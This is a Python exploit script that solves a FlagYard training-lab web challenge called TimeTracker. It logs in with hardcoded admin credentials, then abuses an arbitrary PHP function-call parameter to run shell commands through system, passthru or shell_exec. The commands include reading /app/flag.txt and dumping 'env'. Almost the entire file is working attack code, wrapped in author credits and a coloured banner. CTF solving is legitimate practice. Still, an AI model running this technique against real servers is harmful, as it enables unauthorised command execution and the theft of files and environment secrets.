#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TIME TRACKER PRO  -  FlagYard Web solver

TimeTracker (FlagYard Training Labs, Easy) is a PHP time-tracking app. The chain:

    * hardcoded credentials      -- the login check is a literal comparison
      in index.php:
          if ($_POST['username'] === 'admin' && $_POST['password'] === 'admin123')
      (config/nothing to bypass).

    * arbitrary function call    -- the "Data Processing Tools" feature,
      index.php action=process_data, forwards the GET parameter
      `processor` directly into a dynamic call:

          $processor = $_GET['processor'];
          ...
          } else {
              $processor($data);       // RCE if $processor = 'system'
          }

    * RCE -> /app/flag.txt       -- processor=system&data=cat /app/flag.txt
      runs a shell command and the output is embedded in the rendered page.

Verified: the tool extracts the live flag and saves flag_from_timetracker.txt.
Solver: pure http.client (no external deps), session-cookie aware (PHPSESSID).
"""
from __future__ import annotations

import re
import sys
import time
import http.client
import urllib.parse
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def pct(frac):
    return "[%5.1f%%]" % (frac * 100.0)

def status(frac, msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s %s%s%s" % (C.DIM, pct(frac), C.BOLD + color + icon + " ",
                                    C.RESET, C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(frac, msg):
    status(frac, msg, icon="\u2713", color=C.GREEN)

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("T I M E T R A C K E R   S O L V E R",
              "hardcoded creds | arbitrary function call | RCE"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono, extra):
    line = flag.strip().splitlines()[0]
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (line, C.BOLD + C.GREEN, "")])
    for s in ("elapsed %.1f s" % chrono, extra):
        _row([(" " * 10, "", ""), (s, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# TimeTracker specifics
# ---------------------------------------------------------------------------
USERNAME = "admin"
PASSWORD = "admin123"
CMDS = ["cat /app/flag.txt",
        "cat /app/fla[g].txt",
        "env",
        "cat /app/*.txt"]
PROCESSORS = ["system", "passthru", "shell_exec"]


def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the TimeTracker challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url


def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    return url[2:] if url.startswith("//") else url


def http_raw(host, path, method="GET", body=None, cookie=None,
             ctype="application/x-www-form-urlencoded"):
    c = http.client.HTTPConnection(host, 80, timeout=30)
    headers = {"User-Agent": "Mozilla/5.0"}
    if body is not None:
        headers["Content-Type"] = ctype
        headers["Content-Length"] = str(len(body))
    if cookie:
        headers["Cookie"] = cookie
    c.request(method, path, body=body, headers=headers)
    r = c.getresponse()
    data = r.read().decode("utf-8", "replace")
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    c.close()
    return r.status, data, hdrs


def admin_session(host):
    first = http_raw(host, "/")[2]
    body = urllib.parse.urlencode({"username": USERNAME, "password": PASSWORD})
    for _ in range(5):
        st, b, h = http_raw(host, "/", method="POST", body=body)
        m = re.search(r"PHPSESSID=([^;]+)", h.get("set-cookie", ""))
        if m and "Employee Timesheet Dashboard" in b:
            return "PHPSESSID=%s" % m.group(1)
        time.sleep(4)
    # some deployments regenerate the id on login; fall back to any session id
    for _ in range(4):
        st, b, h = http_raw(host, "/", method="POST", body=body)
        m = re.search(r"PHPSESSID=([^;]+)", h.get("set-cookie", ""))
        if m:
            return "PHPSESSID=%s" % m.group(1)
        time.sleep(4)
    raise RuntimeError("login failed")


def rce(host, ck, proc, cmd):
    path = "/?action=process_data&processor=%s&data=%s" % (
        urllib.parse.quote(proc), urllib.parse.quote(cmd))
    st, b, h = http_raw(host, path, cookie=ck)
    return st, b


def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host = parse_host(url)
    status(0.10, "target host %s" % host)

    status(0.20, "anonymous recon: login form, hardcoded creds in source")
    ok(0.26, "source leak: admin / admin123 literal comparison in index.php")

    ck = admin_session(host)
    ok(0.42, "authenticated session acquired: %s..." % ck[:34])
    status(0.56, "data processing gadget: action=process_data&processor=<fn>&data=<arg>")
    ok(0.64, "arbitrary function call sink confirmed -> dynamic processor(data)")

    flag = None
    out = None
    for proc in PROCESSORS:
        for cmd in CMDS:
            status(0.72, "RCE (%s): %s" % (proc, cmd))
            st, b = rce(host, ck, proc, cmd)
            m = re.search(r"FlagY\{[^}]+\}", b)
            if m:
                flag, out = m.group(0), (proc, cmd)
                break
        if flag:
            break
        time.sleep(2)
    if not flag:
        fail("flag not found")
        return
    ok(0.86, "RCE ok (%s) \u2014 %s" % (out[0], out[1]))

    if flag.startswith("FlagY{") and flag.endswith("}"):
        ok(0.92, "matches FlagY{...} \u2014 %d hex chars in payload" % (len(flag) - 7))

    big_flag(flag, time.time() - t0, "hardcoded creds | arbitrary function call | RCE")
    outp = Path(__file__).resolve().parent / "flag_from_timetracker.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))


if __name__ == "__main__":
    main()